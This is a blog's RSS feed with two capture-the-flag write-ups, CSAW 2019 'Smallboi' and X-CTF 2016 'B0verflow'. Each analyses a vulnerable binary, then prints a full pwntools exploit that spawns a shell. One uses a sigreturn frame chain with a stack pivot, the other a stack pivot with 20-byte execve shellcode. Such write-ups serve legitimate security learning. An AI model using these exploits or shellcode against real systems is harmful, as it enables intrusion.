<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Stack Pivot on Anvbis</title><link>https://anvbis.github.io/categories/stack-pivot/</link><description>Recent content in Stack Pivot on Anvbis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><lastBuildDate>Sun, 15 Aug 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/categories/stack-pivot/index.xml" rel="self" type="application/rss+xml"/><item><title>CSAW 2019 :: Smallboi</title><link>https://anvbis.github.io/posts/csaw-2019-smallboi/</link><pubDate>Sun, 15 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/csaw-2019-smallboi/</guid><description>Reverse Engineering Like usual, we&amp;rsquo;ll start by running file to get a brief overflow of the executable&amp;rsquo;s architecture. Note that it is a 64-bit linux executable.
$ ./small_boi ./small_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=070f96f86ab197c06c4a6896c26254cce3d57650, stripped Running checksec reveals that the only exploit protection in place is that the NX bit is enabled. Meaning we won&amp;rsquo;t be able to execute any shellcode on the stack.</description><content>&lt;h2 id="reverse-engineering">Reverse Engineering&lt;/h2>
&lt;p>Like usual, we&amp;rsquo;ll start by running &lt;code>file&lt;/code> to get a brief overflow of the executable&amp;rsquo;s architecture. Note that it is a 64-bit linux executable.&lt;/p>
&lt;pre>&lt;code>$ ./small_boi
./small_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=070f96f86ab197c06c4a6896c26254cce3d57650, stripped
&lt;/code>&lt;/pre>&lt;p>Running &lt;code>checksec&lt;/code> reveals that the only exploit protection in place is that the NX bit is enabled. Meaning we won&amp;rsquo;t be able to execute any shellcode on the stack.&lt;/p>
&lt;pre>&lt;code>$ checksec ./small_boi
[*] './small_boi'
Arch: amd64-64-little
RELRO: No RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
&lt;/code>&lt;/pre>&lt;p>Running the executable reveals that it, at some point, takes user input. We&amp;rsquo;ll need to investigate this further to determine whether there is a vulnerability present.&lt;/p>
&lt;pre>&lt;code>$ ./small_boi
asdfsadf
&lt;/code>&lt;/pre>&lt;p>Viewing the disassembly of the entrypoint reveals that it calls some unknown function before it makes an &lt;code>exit&lt;/code> syscall.&lt;/p>
&lt;pre>&lt;code>entry0 ();
0x004001ad push rbp
0x004001ae mov rbp, rsp
0x004001b1 mov eax, 0
0x004001b6 call fcn.0040018c
0x004001bb xor rax, rdi
0x004001be mov rax, 0x3c ; '&amp;lt;' ; 60
0x004001c5 syscall ; exit(...)
0x004001c7 nop
0x004001c8 pop rbp
0x004001c9 ret
&lt;/code>&lt;/pre>&lt;p>Disassembling the function called within the entrypoint reveals a likely buffer overflow vulnerability.&lt;/p>
&lt;p>We can see that the function reads 512 bytes of data in from &lt;code>stdin&lt;/code> and stores it at a location only 32 bytes below the base of the function&amp;rsquo;s stack frame.&lt;/p>
&lt;pre>&lt;code>fcn.0040018c ();
; var int64_t var_20h @ rbp-0x20
0x0040018c push rbp
0x0040018d mov rbp, rsp
0x00400190 lea rax, [var_20h] ; rax = *var_20h
0x00400194 mov rsi, rax ; rsi = rax = *var_20h
0x00400197 xor rax, rax ; rax = 0
0x0040019a xor rdi, rdi ; rdi = 0
0x0040019d mov rdx, 0x200 ; rdx = 512
0x004001a4 syscall ; read(stdin, *var_20h, 512)
0x004001a6 mov eax, 0
0x004001ab pop rbp
0x004001ac ret
&lt;/code>&lt;/pre>&lt;p>Looking at the disassembly for the &lt;code>.text&lt;/code> section, we can see a sigreturn syscall. We can use this to execute any arbitrary syscall with a forged sigreturn frame.&lt;/p>
&lt;pre>&lt;code>;-- section..text:
0x0040017c push rbp ; [02] -r-x section size 78 named .text
0x0040017d mov rbp, rsp
0x00400180 mov eax, 0xf ; 15
0x00400185 syscall ; rt_sigreturn(...)
0x00400187 nop
0x00400188 pop rbp
0x00400189 ret
&lt;/code>&lt;/pre>&lt;p>We also discover a &lt;code>&amp;quot;/bin/sh&amp;quot;&lt;/code> string stored in the &lt;code>.rodata&lt;/code> section. This could be very useful - however, I&amp;rsquo;m going to avoid using it.&lt;/p>
&lt;p>I believe there should be another solution (albeit a more complex solution) that allows us to avoid using this string. I&amp;rsquo;ve arbitrarily decided that it feels a little like cheating.&lt;/p>
&lt;pre>&lt;code>;-- str.bin_sh:
;-- section..rodata:
0x004001ca .string &amp;quot;/bin/sh&amp;quot; ; len=8 ; [03] -r-- section size 8 named .rodata
&lt;/code>&lt;/pre>&lt;p>For our alternative solution, we need to find a section within the binary that we have write permissions for.&lt;/p>
&lt;p>Using &lt;code>readelf&lt;/code>, we can see that we have write permissions for the &lt;code>.data&lt;/code> section, stored at &lt;code>0x601000&lt;/code>. We&amp;rsquo;ll use this location to write a &lt;code>&amp;quot;/bin/sh&amp;quot;&lt;/code> string, and pivot our stack.&lt;/p>
&lt;pre>&lt;code>$ readelf --sections ./small_boi
There are 9 section headers, starting at offset 0x1090:
Section Headers:
[Nr] Name Type Address Offset
Size EntSize Flags Link Info Align
[ 0] NULL 0000000000000000 00000000
0000000000000000 0000000000000000 0 0 0
[ 1] .note.gnu.bu[...] NOTE 0000000000400158 00000158
0000000000000024 0000000000000000 A 0 0 4
[ 2] .text PROGBITS 000000000040017c 0000017c
000000000000004e 0000000000000000 AX 0 0 1
[ 3] .rodata PROGBITS 00000000004001ca 000001ca
0000000000000008 0000000000000000 A 0 0 1
[ 4] .eh_frame_hdr PROGBITS 00000000004001d4 000001d4
0000000000000024 0000000000000000 A 0 0 4
[ 5] .eh_frame PROGBITS 00000000004001f8 000001f8
0000000000000078 0000000000000000 A 0 0 8
[ 6] .data PROGBITS 0000000000601000 00001000
0000000000000010 0000000000000000 WA 0 0 8
[ 7] .comment PROGBITS 0000000000000000 00001010
000000000000002a 0000000000000001 MS 0 0 1
[ 8] .shstrtab STRTAB 0000000000000000 0000103a
0000000000000053 0000000000000000 0 0 1
&lt;/code>&lt;/pre>&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
&lt;p>Let&amp;rsquo;s do a little more information gathering before we write our exploit. We just need to find the offset of the return address from the start of the input buffer.&lt;/p>
&lt;p>Here&amp;rsquo;s a quick script that&amp;rsquo;ll send a cyclic pattern of bytes to the input that we can use to find the offset of the return address.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./small_boi&amp;#39;&lt;/span>)
gdb&lt;span style="color:#f92672">.&lt;/span>attach(r)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(cyclic(&lt;span style="color:#ae81ff">512&lt;/span>, n&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>))
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Continuing in GDB, and letting the executable crash, reveals the data that overwrote the value of the return address.&lt;/p>
&lt;pre>&lt;code> â–º 0x4001ac ret &amp;lt;0x6161616161616166&amp;gt;
&lt;/code>&lt;/pre>&lt;p>Using pwntools' &lt;code>cyclic_find&lt;/code> function, and using the value above, we can find the offset of the return address from the start of our input buffer.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">In [&lt;span style="color:#ae81ff">2&lt;/span>]: cyclic_find(&lt;span style="color:#ae81ff">0x6161616161616166&lt;/span>, n&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>)
Out[&lt;span style="color:#ae81ff">2&lt;/span>]: &lt;span style="color:#ae81ff">40&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploit-development">Exploit Development&lt;/h2>
&lt;p>We can chain sigreturn instructions to perform a &lt;code>read&lt;/code> syscall and store &lt;code>&amp;quot;/bin/sh&amp;quot;&lt;/code> in memory, before making another sigreturn call to execute &lt;code>execve&lt;/code> with our &lt;code>&amp;quot;/bin/sh&amp;quot;&lt;/code> string.&lt;/p>
&lt;p>We just need to make sure that our first forged sigreturn frame maintains &lt;code>$rip&lt;/code> and pivots the stack to &lt;code>.data&lt;/code>, where we can continue execution.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
context&lt;span style="color:#f92672">.&lt;/span>clear(arch&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;amd64&amp;#39;&lt;/span>)
pad &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span>
&lt;span style="color:#75715e"># address of sigreturn syscall&lt;/span>
sigret &lt;span style="color:#f92672">=&lt;/span> p64(&lt;span style="color:#ae81ff">0x00400180&lt;/span>)
&lt;span style="color:#75715e"># address of &amp;#34;/bin/sh&amp;#34; string &lt;/span>
bin_sh &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x004001ca&lt;/span>
&lt;span style="color:#75715e"># address of syscall instruction&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">syscall; nop; pop rbp; ret
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
syscall &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0400185&lt;/span>
&lt;span style="color:#75715e"># address of data section&lt;/span>
data &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x00601000&lt;/span>
read_frame &lt;span style="color:#f92672">=&lt;/span> SigreturnFrame()
read_frame&lt;span style="color:#f92672">.&lt;/span>rax &lt;span style="color:#f92672">=&lt;/span> constants&lt;span style="color:#f92672">.&lt;/span>SYS_read
read_frame&lt;span style="color:#f92672">.&lt;/span>rdi &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
read_frame&lt;span style="color:#f92672">.&lt;/span>rsi &lt;span style="color:#f92672">=&lt;/span> data
read_frame&lt;span style="color:#f92672">.&lt;/span>rdx &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1000&lt;/span>
read_frame&lt;span style="color:#f92672">.&lt;/span>rip &lt;span style="color:#f92672">=&lt;/span> syscall
read_frame&lt;span style="color:#f92672">.&lt;/span>rsp &lt;span style="color:#f92672">=&lt;/span> data &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>
read_frame &lt;span style="color:#f92672">=&lt;/span> bytes(read_frame)
execve_frame &lt;span style="color:#f92672">=&lt;/span> SigreturnFrame()
execve_frame&lt;span style="color:#f92672">.&lt;/span>rax &lt;span style="color:#f92672">=&lt;/span> constants&lt;span style="color:#f92672">.&lt;/span>SYS_execve
execve_frame&lt;span style="color:#f92672">.&lt;/span>rdi &lt;span style="color:#f92672">=&lt;/span> data
execve_frame&lt;span style="color:#f92672">.&lt;/span>rsi &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
execve_frame&lt;span style="color:#f92672">.&lt;/span>rdx &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
execve_frame&lt;span style="color:#f92672">.&lt;/span>rip &lt;span style="color:#f92672">=&lt;/span> syscall
execve_frame &lt;span style="color:#f92672">=&lt;/span> bytes(execve_frame)
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./small_boi&amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(pad &lt;span style="color:#f92672">+&lt;/span> sigret &lt;span style="color:#f92672">+&lt;/span> read_frame)
r&lt;span style="color:#f92672">.&lt;/span>clean(&lt;span style="color:#ae81ff">1&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>writeline(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/bin/sh&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#f92672">+&lt;/span> sigret &lt;span style="color:#f92672">+&lt;/span> execve_frame)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And finally, here&amp;rsquo;s our exploit in action.&lt;/p>
&lt;pre>&lt;code>$ ./exploit.py
[+] Starting local process './small_boi': pid 2731
[*] Switching to interactive mode
$ cat flag.txt
csaw19{smallboi}
$
[*] Stopped process './small_boi' (pid 2731)
&lt;/code>&lt;/pre></content></item><item><title>X-CTF 2016 :: B0verflow</title><link>https://anvbis.github.io/posts/xctf-2016-b0verflow/</link><pubDate>Fri, 13 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/xctf-2016-b0verflow/</guid><description>Reverse Engineering Let&amp;rsquo;s begin by using the file command to get a little insight into this executable. Note that it is a 32-bit linux binary.
$ file ./b0verflow ./b0verflow: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9f2d9dc0c9cc531c9656e6e84359398dd765b684, not stripped We can also use checksec to get an overview of what exploit protections it has. Note that there is no stack canary and the NX bit is not set, so it is likely vulnerable to a classic stack overflow.</description><content>&lt;h2 id="reverse-engineering">Reverse Engineering&lt;/h2>
&lt;p>Let&amp;rsquo;s begin by using the &lt;code>file&lt;/code> command to get a little insight into this executable. Note that it is a 32-bit linux binary.&lt;/p>
&lt;pre>&lt;code>$ file ./b0verflow
./b0verflow: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9f2d9dc0c9cc531c9656e6e84359398dd765b684, not stripped
&lt;/code>&lt;/pre>&lt;p>We can also use &lt;code>checksec&lt;/code> to get an overview of what exploit protections it has. Note that there is no stack canary and the NX bit is not set, so it is likely vulnerable to a classic stack overflow.&lt;/p>
&lt;pre>&lt;code>$ checksec ./b0verflow
[*] './b0verflow'
Arch: i386-32-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX disabled
PIE: No PIE (0x8048000)
RWX: Has RWX segments
&lt;/code>&lt;/pre>&lt;p>Running the binary reveals that it at some point prompts us for user input. This is likely where we&amp;rsquo;ll find a vulnerability (perhaps it reads to much data in).&lt;/p>
&lt;pre>&lt;code>$ ./b0verflow
======================
Welcome to X-CTF 2016!
======================
What's your name?
anvbis
Hello anvbis
.
&lt;/code>&lt;/pre>&lt;p>Disassembling the &lt;code>main&lt;/code> function reveals that it calls a function &lt;code>vul&lt;/code>. We&amp;rsquo;ll want to investigate this function next, I get the feeling it&amp;rsquo;s vulnerable.&lt;/p>
&lt;pre>&lt;code>int main (int argc, char **argv, char **envp);
0x0804850e push ebp
0x0804850f mov ebp, esp
0x08048511 and esp, 0xfffffff0
0x08048514 call vul ; sym.vul
0x08048519 leave
0x0804851a ret
&lt;/code>&lt;/pre>&lt;p>Reversing the &lt;code>vul&lt;/code> function shows that it reads in 0x32 bytes from stdin, and stores them at a pointer &lt;code>*s&lt;/code>. However, we can see that no memory (beyond the size of the pointer itself) is allocated on the stack at this address.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">undefined4 &lt;span style="color:#a6e22e">vul&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>s;
puts(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">======================&amp;#34;&lt;/span>);
puts(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">Welcome to X-CTF 2016!&amp;#34;&lt;/span>);
puts(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">======================&amp;#34;&lt;/span>);
puts(&lt;span style="color:#e6db74">&amp;#34;What&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">s your name?&amp;#34;&lt;/span>);
fflush(_reloc.stdout);
fgets(&lt;span style="color:#f92672">&amp;amp;&lt;/span>s, &lt;span style="color:#ae81ff">0x32&lt;/span>, _reloc.stdin);
printf(&lt;span style="color:#e6db74">&amp;#34;Hello %s.&amp;#34;&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>s);
fflush(_reloc.stdout);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We&amp;rsquo;ve found our stack buffer overflow.&lt;/p>
&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
&lt;p>Next, let&amp;rsquo;s find where the return address is relative to our input buffer. Note that the &lt;code>vul&lt;/code> function doesn&amp;rsquo;t read many bytes in (only 0x32) so hopefully this is enough to reach the return address.&lt;/p>
&lt;p>Here&amp;rsquo;s a simple script that attaches the process to GDB and sends a cyclic pattern of 100 bytes that we can use to determine the return address' offset.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./b0verflow&amp;#39;&lt;/span>)
gdb&lt;span style="color:#f92672">.&lt;/span>attach(r)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(cyclic(&lt;span style="color:#ae81ff">100&lt;/span>))
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can continue in GDB and watch the process crash when it tries to return to our garbage data. See the top of the stack below, it seems we can only write about 9 bytes past the return address, this will complicate our exploit.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; x/4x $esp
0xff93cf20: 0x6161616b 0x6161616c 0x0000006d 0xf7de4e46
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s print out the value of &lt;code>$eip&lt;/code> and use pwntools' &lt;code>cyclic_find&lt;/code> function to find the offset. It appears that &lt;code>$eip&lt;/code> is 36 bytes after the start of our input buffer.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; p $eip
$1 = (void (*)()) 0x6161616a
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">In [&lt;span style="color:#ae81ff">2&lt;/span>]: cyclic_find(&lt;span style="color:#ae81ff">0x6161616a&lt;/span>)
Out[&lt;span style="color:#ae81ff">2&lt;/span>]: &lt;span style="color:#ae81ff">36&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>So, now we need to solve the limited space issue (9 bytes is not enough space to store a complex ROP chain). Let&amp;rsquo;s use the &lt;code>ropper&lt;/code> tool to see if we can find any gadgets to pivot our stack.&lt;/p>
&lt;pre>&lt;code>$ ropper --file ./b0verflow --stack-pivot
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
Gadgets
=======
0x08048609: add esp, 0x1c; pop ebx; pop esi; pop edi; pop ebp; ret;
0x0804837e: add esp, 8; pop ebx; ret;
0x0804847e: ret 0xeac1;
0x08048500: sub esp, 0x24; ret;
4 gadgets found
&lt;/code>&lt;/pre>&lt;p>The gadget that I immediately noticed was &lt;code>sub esp, 0x24; ret&lt;/code>, this will allow us to move the stack almost all the way to the start of our input buffer (about 4 bytes into our input buffer, to be exact).&lt;/p>
&lt;pre>&lt;code>0x08048500: sub esp, 0x24; ret;
&lt;/code>&lt;/pre>&lt;p>Now we just need something like a &lt;code>jmp esp&lt;/code> or a &lt;code>mov eax, esp; jmp eax&lt;/code> gadget to direct process execution to our shellcode. Using &lt;code>ropper&lt;/code> again, we immediately find a &lt;code>jmp esp&lt;/code> instruction.&lt;/p>
&lt;pre>&lt;code>$ ropper --file ./b0verflow --search 'jmp esp' 130 â¨¯
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: jmp esp
[INFO] File: ./b0verflow
0x08048504: jmp esp;
&lt;/code>&lt;/pre>&lt;h2 id="exploit-development">Exploit Development&lt;/h2>
&lt;p>Now that we have all the information we need, we can start developing our exploit.&lt;/p>
&lt;p>Let&amp;rsquo;s write some shellcode. We only have a limited amount of space to store it (about 32 bytes), so I&amp;rsquo;ve used various techniques (such as using &lt;code>xor&lt;/code> to set registers to &lt;code>0&lt;/code>) to reduce the size of the shellcode.&lt;/p>
&lt;pre>&lt;code>.global _start
_start:
.intel_syntax noprefix
shell:
push 0x0068732f # &amp;quot;/sh&amp;quot;
push 0x6e69622f # &amp;quot;/bin&amp;quot;
mov ebx, esp # &amp;quot;/bin/sh&amp;quot;
xor ecx, ecx
xor edx, edx
mov al, 11
int 0x80 # execve(&amp;quot;/bin/sh&amp;quot;)
&lt;/code>&lt;/pre>&lt;pre>&lt;code>$ gcc -nostdlib -static shellcode.s -o shellcode -m32
$ objcopy --dump-section .text=payload shellcode
&lt;/code>&lt;/pre>&lt;p>After compilation, we can see that our shellcode is only 20 bytes long, very nice.&lt;/p>
&lt;pre>&lt;code>08049000 &amp;lt;_start&amp;gt;:
8049000: 68 2f 73 68 00 push $0x68732f
8049005: 68 2f 62 69 6e push $0x6e69622f
804900a: 89 e3 mov %esp,%ebx
804900c: 31 c9 xor %ecx,%ecx
804900e: 31 d2 xor %edx,%edx
8049010: b0 0b mov $0xb,%al
8049012: cd 80 int $0x80
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">In [&lt;span style="color:#ae81ff">1&lt;/span>]: open(&lt;span style="color:#e6db74">&amp;#39;payload&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;rb&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>read()
Out[&lt;span style="color:#ae81ff">1&lt;/span>]: &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;h/sh&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">h/bin&lt;/span>&lt;span style="color:#ae81ff">\x89\xe3&lt;/span>&lt;span style="color:#e6db74">1&lt;/span>&lt;span style="color:#ae81ff">\xc9&lt;/span>&lt;span style="color:#e6db74">1&lt;/span>&lt;span style="color:#ae81ff">\xd2\xb0\x0b\xcd\x80&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
In [&lt;span style="color:#ae81ff">2&lt;/span>]: len(open(&lt;span style="color:#e6db74">&amp;#39;payload&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;rb&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>read())
Out[&lt;span style="color:#ae81ff">2&lt;/span>]: &lt;span style="color:#ae81ff">20&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now we can write our final exploit. Note that we need to add the address to the &lt;code>jmp esp&lt;/code> gadget 4 bytes after the start of our input buffer (as this is where the program will attempt to get the next return address after our stack pivot).&lt;/p>
&lt;p>Here&amp;rsquo;s an overview of what we want to achieve:&lt;/p>
&lt;ul>
&lt;li>Pivot our stack with the &lt;code>sub esp, 0x24; ret&lt;/code> gadget.&lt;/li>
&lt;li>Jump to &lt;code>$esp&lt;/code>, where our shellcode is stored.&lt;/li>
&lt;li>Get shellcode execution.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">0x08048504: jmp esp;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
jmp_esp &lt;span style="color:#f92672">=&lt;/span> p32(&lt;span style="color:#ae81ff">0x08048504&lt;/span>)
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">0x08048500: sub esp, 0x24; ret;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
sub_esp &lt;span style="color:#f92672">=&lt;/span> p32(&lt;span style="color:#ae81ff">0x08048500&lt;/span>)
buf &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;h/sh&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">h/bin&lt;/span>&lt;span style="color:#ae81ff">\x89\xe3&lt;/span>&lt;span style="color:#e6db74">1&lt;/span>&lt;span style="color:#ae81ff">\xc9&lt;/span>&lt;span style="color:#e6db74">1&lt;/span>&lt;span style="color:#ae81ff">\xd2\xb0\x0b\xcd\x80&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
lpad &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>
rpad &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#ae81ff">36&lt;/span> &lt;span style="color:#f92672">-&lt;/span> len(buf) &lt;span style="color:#f92672">-&lt;/span> len(jmp_esp) &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>)
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./b0verflow&amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(lpad &lt;span style="color:#f92672">+&lt;/span> jmp_esp &lt;span style="color:#f92672">+&lt;/span> buf &lt;span style="color:#f92672">+&lt;/span> rpad &lt;span style="color:#f92672">+&lt;/span> sub_esp)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And finally, here&amp;rsquo;s our exploit in action.&lt;/p>
&lt;pre>&lt;code>$ ./exploit.py
[+] Starting local process './b0verflow': pid 2328
[*] Switching to interactive mode
$ cat flag.txt
X-CTF{b0verflow}
$
[*] Stopped process './b0verflow' (pid 2328)
&lt;/code>&lt;/pre></content></item></channel></rss>